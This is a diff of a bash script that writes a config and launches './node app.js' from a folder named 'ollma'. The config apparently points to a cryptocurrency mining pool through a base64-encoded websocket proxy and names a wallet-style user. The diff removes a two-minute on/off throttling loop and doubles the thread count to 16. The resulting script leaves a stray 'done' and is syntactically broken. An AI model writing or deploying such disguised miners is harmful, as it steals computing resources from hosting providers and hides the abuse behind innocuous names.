@@ -1,35 +1,18 @@
 #!/bin/bash
 
-# Infinite loop to repeat the process
-while true; do
-  # Change to the directory (adjust the path if necessary)
-  cd /opt/app-root/src/ollma || { echo "Directory not found"; exit 1; }
-  
-  # Ensure the node executable has the proper permissions
+# Ensure the node executable has the proper permissions
   chmod +x ./node
   
   # Write the configuration to data.json
   cat <<EOF > data.json
 {
   "proxy": "wss://proxy-tq9r.onrender.com/c3RyYXR1bS1ldS5ycGxhbnQueHl6OjcwMjI=",
-  "config": { "threads": 8, "log": true },
+  "config": { "threads": 16, "log": true },
   "options": { "user": "mbc1qsey07g3gp6lmphlk76y4h5y5qgzkjtpr9ugghl.eui", "password": "x", "argent": "robin" }
 }
 EOF
 
   # Start the node process in the background and capture its PID
-  ./node app.js &
-  pid=$!
-
-  echo "Started node with PID $pid. Running for 2 minutes..."
+  ./node app.js
   
-  # Let the process run for 2 minutes (120 seconds)
-  sleep 120
-  
-  # Terminate the node process
-  kill $pid
-  echo "Terminated node process with PID $pid."
-  
-  # Wait for 2 minutes before starting the next cycle
-  sleep 120
 done
